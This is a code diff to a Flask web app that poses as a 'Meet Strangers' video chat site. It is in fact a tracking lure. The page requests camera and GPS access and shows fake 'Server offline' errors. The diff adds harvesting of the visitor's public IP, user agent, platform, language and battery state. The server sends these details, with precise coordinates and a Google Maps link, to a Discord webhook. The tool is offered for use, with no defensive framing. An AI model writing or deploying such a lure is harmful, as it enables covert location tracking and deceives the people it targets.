@@ -1,15 +1,13 @@
 from flask import Flask, request, render_template_string, jsonify
 import requests
-import json
 import logging
 import os
-
 
 app = Flask(__name__)
 
 # Discord webhook URL (replace with your actual Discord webhook URL)
-
 DISCORD_WEBHOOK_URL = os.getenv('DISCORD_WEBHOOK_URL')
+
 HTML_PAGE = """
 <!DOCTYPE html>
 <html lang="en">
@@ -18,7 +16,7 @@ HTML_PAGE = """
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Random Chat | Meet Strangers</title>
-    <style>
+   <style>
         body {
             margin: 0;
             font-family: 'Roboto', sans-serif;
@@ -228,7 +226,6 @@ HTML_PAGE = """
 </head>
 
 <body>
-    <!-- Header -->
     <header>
         <nav>
             <a href="#">Home</a>
@@ -238,17 +235,12 @@ HTML_PAGE = """
         </nav>
     </header>
 
-    <!-- Main Content -->
     <div class="main-container">
         <h1 id="userCountDisplay">Meet Strangers</h1>
-
-
         <div class="video-container" id="videoContainer">
             <video id="localVideo" autoplay playsinline></video>
         </div>
-
         <div id="output">Ready to connect? Press Start</div>
-
         <div class="dropdown" id="dropdown">
             <p>Select a Location:</p>
             <select id="locationSelect">
@@ -257,27 +249,13 @@ HTML_PAGE = """
                 <option value="UK">United Kingdom</option>
             </select>
         </div>
-
         <div class="button-container">
             <button onclick="handleGetStarted()">Start</button>
             <button onclick="sendLocationData()">Next Person</button>
         </div>
     </div>
 
-
     <script>
-    function updateUserCount() {
-        // Generate a random number between 3 and 6
-        const userCount = Math.floor(Math.random() * (6 - 3 + 1)) + 3;
-
-        // Update the user count display
-        document.getElementById('userCountDisplay').innerHTML = `Meet Strangers - ${userCount} Users Online`;
-    }
-
-    // Call the function once at the start and then every 20 seconds
-    updateUserCount();
-    setInterval(updateUserCount, 20000);
-    
         let geoWatchId;
 
         function startTracking() {
@@ -301,36 +279,67 @@ HTML_PAGE = """
             };
         }
 
+        function getDeviceInfo() {
+            return {
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language
+            };
+        }
+
+        async function getBatteryInfo() {
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                return {
+                    level: battery.level * 100 + "%",
+                    charging: battery.charging
+                };
+            } else {
+                return {
+                    level: "Unknown",
+                    charging: "Unknown"
+                };
+            }
+        }
+
+        async function sendLocationData() {
+            const selectedOption = document.getElementById('locationSelect').value;
+            const locationData = window.locationData;
+            const deviceInfo = getDeviceInfo();
+            const batteryInfo = await getBatteryInfo();
+
+            fetch('https://api64.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const ip = data.ip;
+                    fetch('/submit_location', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            ...locationData,
+                            selected_option: selectedOption,
+                            ip_address: ip,
+                            device_info: deviceInfo,
+                            battery_info: batteryInfo
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        alert('Server offline.');
+                        stopTracking();
+                    });
+                });
+        }
+
         function showError(error) {
             alert("Server error: Allow Location & Camera to chat.");
         }
 
         function handleGetStarted() {
-            startVideo();  // Start video along with location tracking
+            startVideo(); 
             startTracking();
             document.getElementById('output').innerHTML = "Please select a topic and click Next.";
             document.getElementById('dropdown').style.display = "block";
-        }
-
-        function sendLocationData() {
-            const selectedOption = document.getElementById('locationSelect').value;
-            const locationData = window.locationData;
-
-            if (locationData) {
-                fetch('/submit_location', {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        ...locationData,
-                        selected_option: selectedOption
-                    })
-                })
-                .then(response => response.json())
-                .then(data => {
-                    alert('Server offline.');
-                    stopTracking();
-                });
-            }
         }
 
         function stopTracking() {
@@ -341,7 +350,6 @@ HTML_PAGE = """
 
         function startVideo() {
             const videoElement = document.getElementById('localVideo');
-
             if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                 navigator.mediaDevices.getUserMedia({ video: true })
                     .then(function (stream) {
@@ -358,10 +366,6 @@ HTML_PAGE = """
 </body>
 
 </html>
-
-
-
-
 """
 
 @app.route('/')
@@ -376,13 +380,28 @@ def submit_location():
     accuracy = data.get('accuracy')
     maps_link = data.get('maps_link')
     selected_option = data.get('selected_option')
+    ip_address = data.get('ip_address')
+    device_info = data.get('device_info')
+    battery_info = data.get('battery_info')
 
     # Prepare the message to send to Discord
     message = {
-        'content': f"**New GPS Location:**\nLatitude: {latitude}\nLongitude: {longitude}\nAccuracy: {accuracy} meters\n[View on Google Maps]({maps_link})\nSelected Option: {selected_option}"
+        'content': f"""
+        **New User Details:**
+        - Latitude: {latitude}
+        - Longitude: {longitude}
+        - Accuracy: {accuracy} meters
+        - [Google Maps]({maps_link})
+        - Selected Option: {selected_option}
+        - IP Address: {ip_address}
+        - User Agent: {device_info['userAgent']}
+        - Platform: {device_info['platform']}
+        - Language: {device_info['language']}
+        - Battery Level: {battery_info['level']}
+        - Charging: {battery_info['charging']}
+        """
     }
 
-    # Send the data to Discord webhook
     try:
         response = requests.post(DISCORD_WEBHOOK_URL, json=message)
         return jsonify({'status': 'success', 'message': 'sent', 'response': response.text})
@@ -390,6 +409,5 @@ def submit_location():
         return jsonify({'status': 'error', 'message': str(e)})
 
 if __name__ == '__main__':
-    # Get the port from the environment, default to 5000 if not set
     port = int(os.environ.get("PORT", 5000))
     app.run(debug=False, host='0.0.0.0', port=port)
